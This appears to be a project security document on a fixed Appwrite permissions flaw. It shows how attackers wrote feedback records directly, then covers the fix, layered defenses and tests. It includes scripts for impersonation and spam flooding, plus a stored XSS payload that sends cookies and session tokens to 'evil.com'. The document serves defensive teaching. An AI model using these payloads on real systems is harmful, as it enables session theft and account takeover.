# Attack Example: Direct Database Write

## ⚠️ WARNING: For Educational Purposes Only

This document shows how an attacker could bypass security **before the fix**. After removing "Create" permissions, these attacks will fail.

---

## Attack Scenario: Bypassing process-feedback

### Step 1: Attacker Opens Browser Console

An attacker opens your website, logs in (or creates an account), then opens browser DevTools console (F12).

### Step 2: Import Appwrite SDK

```javascript
// In browser console:

// Option A: If your app exposes the SDK globally
const { databases } = window.appwriteSDK

// Option B: Import from your bundled code
const databases = require('app/provider/appwrite/api').databases

// Option C: Create their own client
const { Client, Databases } = require('node-appwrite')
const client = new Client()
  .setEndpoint('https://cloud.appwrite.io/v1') // Your Appwrite endpoint
  .setProject('your-project-id') // Your project ID (visible in network requests)

const databases = new Databases(client)
```

### Step 3: Direct Write Attack (Before Fix)

```javascript
// ❌ BEFORE FIX: This succeeds and bypasses ALL security!

await databases.createDocument(
  'your-database-id', // Found in network requests
  'usersFeedback', // Collection ID (visible in Appwrite console or network)
  'unique()', // Generate unique ID
  {
    user_id: 'any_user_id', // Can impersonate anyone!
    message: '<script>alert("XSS")</script>', // XSS payload
    page_url: 'https://evil.com', // Fake URL
  }
)

// Result: Document created!
// - No CAPTCHA verification ❌
// - No rate limiting ❌
// - No input sanitization ❌
// - No suspicious activity log ❌
```

### Step 4: Spam Attack

```javascript
// Spam 1000 feedback entries in seconds
for (let i = 0; i < 1000; i++) {
  await databases.createDocument(
    'your-database-id',
    'usersFeedback',
    'unique()',
    {
      user_id: 'victim_user_id',
      message: `Spam message ${i}`,
      page_url: 'https://spam.com',
    }
  )
}

// Result: Database flooded with spam ❌
```

### Step 5: XSS Attack

```javascript
// Store XSS payload in database
await databases.createDocument(
  'your-database-id',
  'usersFeedback',
  'unique()',
  {
    user_id: 'attacker_id',
    message: `
      <img src=x onerror="
        fetch('https://evil.com/steal?cookie=' + document.cookie);
        fetch('https://evil.com/steal?token=' + localStorage.getItem('appwrite-session'));
      ">
    `,
    page_url: 'https://jomcontest.com',
  }
)

// If admin views this feedback without sanitization:
// - Session token stolen ❌
// - Cookies stolen ❌
// - Account compromised ❌
```

---

## ✅ After Fix: All Attacks Fail

### Step 1: Remove "Create" Permissions

```
Appwrite Console → Databases → usersFeedback → Settings → Permissions
- Remove: Create (Users) ✅
- Keep: Read (Users, own documents) ✅
```

### Step 2: Attacker Tries Same Attack

```javascript
// ✅ AFTER FIX: This fails!

await databases.createDocument(
  'your-database-id',
  'usersFeedback',
  'unique()',
  {
    user_id: 'any_user_id',
    message: '<script>alert("XSS")</script>',
    page_url: 'https://evil.com',
  }
)

// Result: Error!
// AppwriteException: Missing permissions (document.create)
// Status: 401 Unauthorized
```

### Step 3: Only Valid Path Works

```javascript
// ✅ Attacker must use the UI (which enforces security)

// User clicks feedback button
// → FeedbackDialog opens
// → User enters message
// → CAPTCHA verification required ✅
// → Rate limiting enforced ✅
// → Input sanitized ✅
// → Suspicious activity logged ✅
// → process-feedback function creates document (with API key)
```

---

## 🔍 How Attackers Find Your API Details

### 1. Network Requests

Open DevTools → Network tab → Submit feedback:

```http
POST https://cloud.appwrite.io/v1/functions/your-function-id/executions
Headers:
  X-Appwrite-Project: your-project-id
  X-SDK-Version: appwrite:web:11.0.0
Body:
  {
    "user_id": "user123",
    "message": "test",
    "page_url": "https://jomcontest.com",
    "captcha_token": "xxx"
  }
```

**Attacker learns:**

- Appwrite endpoint: `https://cloud.appwrite.io/v1`
- Project ID: `your-project-id`
- Database ID: (visible in other requests)
- Collection ID: `usersFeedback`

### 2. JavaScript Bundle

Attacker inspects your bundled JavaScript:

```javascript
// In your app's JS bundle:
const DATABASE_ID = 'production'
const USERS_FEEDBACK_COLLECTION_ID = 'usersFeedback'
const APPWRITE_PROJECT_ID = '67123abc...'
```

### 3. Appwrite Console (If Accessible)

If attacker creates an account and has access to Appwrite console:

- Can see all collection names
- Can see all attribute names
- Can see permissions
- Can test API directly

---

## 🛡️ Defense: Multiple Layers

### Layer 1: Collection Permissions (This Fix)

```
usersFeedback collection:
- Create: (none) ✅
- Read: Users (own documents) ✅
```

**Result:** Direct writes fail with 401 Unauthorized

### Layer 2: Function Validation

```javascript
// In process-feedback function:
1. Verify CAPTCHA token ✅
2. Check rate limits ✅
3. Sanitize input ✅
4. Log suspicious activity ✅
5. Create document (with API key) ✅
```

**Result:** Even if attacker calls function, security is enforced

### Layer 3: API Key Scopes

```
INTERNAL_API_KEY scopes:
- databases.write (only for specific collections)
- execution.read (only for calling other functions)
- users.read (only for fetching user data)
```

**Result:** API key has minimal permissions

### Layer 4: Input Sanitization

```javascript
// In sanitize-text function:
- Remove HTML tags ✅
- Remove script patterns ✅
- Remove dangerous schemes ✅
- Enforce length limits ✅
```

**Result:** XSS payloads are neutralized

### Layer 5: Rate Limiting

```javascript
// In validate-captcha function:
- Per-user limits (10/hour) ✅
- Per-IP limits (20/hour) ✅
- Global limits (1000/hour) ✅
```

**Result:** Spam attacks are throttled

---

## 🧪 Test the Fix

### Test 1: Direct Write (Should Fail)

**In browser console:**

```javascript
// Import Appwrite SDK
import { databases } from 'app/provider/appwrite/api'

// Try to create document directly
try {
  const result = await databases.createDocument(
    'production', // Your database ID
    'usersFeedback',
    'unique()',
    {
      user_id: 'test',
      message: 'test',
      page_url: 'https://test.com',
    }
  )
  console.log('❌ SECURITY ISSUE: Direct write succeeded!', result)
} catch (error) {
  console.log('✅ SECURE: Direct write blocked!', error.message)
  // Expected: "Missing permissions (document.create)"
}
```

### Test 2: Function Write (Should Succeed)

**In UI:**

1. Click feedback button
2. Enter message: "Test feedback"
3. Complete CAPTCHA
4. Click "Submit Feedback"
5. Should succeed with success toast ✅

### Test 3: Verify in Database

**In Appwrite Console:**

1. Go to Databases → usersFeedback → Documents
2. Find the test document
3. Verify:
   - `message` is sanitized (no HTML tags)
   - `page_url` is valid
   - `user_id` matches logged-in user
   - `$createdAt` timestamp is recent

---

## 📊 Attack Impact Comparison

### Before Fix (Vulnerable):

| Attack Type       | Possible? | Impact                       |
| ----------------- | --------- | ---------------------------- |
| Spam flooding     | ✅ Yes    | Database filled with garbage |
| XSS injection     | ✅ Yes    | Admin accounts compromised   |
| Impersonation     | ✅ Yes    | Fake feedback from any user  |
| Rate limit bypass | ✅ Yes    | Unlimited submissions        |
| CAPTCHA bypass    | ✅ Yes    | Bot attacks succeed          |

### After Fix (Secure):

| Attack Type       | Possible? | Impact                   |
| ----------------- | --------- | ------------------------ |
| Spam flooding     | ❌ No     | Rate limiting enforced   |
| XSS injection     | ❌ No     | Input sanitized          |
| Impersonation     | ❌ No     | User ID from auth token  |
| Rate limit bypass | ❌ No     | Function enforces limits |
| CAPTCHA bypass    | ❌ No     | Function verifies token  |

---

## 🚨 Real-World Attack Scenario

### Timeline:

**Day 1 (Before Fix):**

- Attacker discovers vulnerability
- Writes script to spam feedback
- Submits 10,000 entries in 10 minutes
- Database storage costs spike
- Admin dashboard unusable

**Day 2:**

- Attacker injects XSS payload
- Admin views feedback
- Session token stolen
- Attacker gains admin access
- Deletes all contests
- Steals user data

**Day 3:**

- Users report missing contests
- Reputation damaged
- Legal liability for data breach
- Business impact: $$$$$

### With Fix:

**Day 1:**

- Attacker tries to spam
- Gets 401 Unauthorized error
- Gives up and moves on
- Business continues normally ✅

---

## 💡 Key Takeaways

1. **Never trust client-side security** - Always enforce on server
2. **Use collection permissions** - Restrict who can create documents
3. **Use API keys for functions** - Server-side permissions bypass user limits
4. **Defense in depth** - Multiple layers of security
5. **Test your security** - Try to attack your own app

---

## 📚 Related Documentation

- `docs/SECURITY_FIX_USERS_FEEDBACK.md` - Complete fix guide
- `docs/SECURITY_FAQ.md` - Common security questions
- `docs/DEPLOYMENT_SETUP_GUIDE.md` - Setup instructions
- `functions/process-feedback/index.js` - Secure function implementation

---

_Last Updated: October 27, 2025_
_⚠️ For Educational Purposes Only_
_Do Not Use for Malicious Purposes_
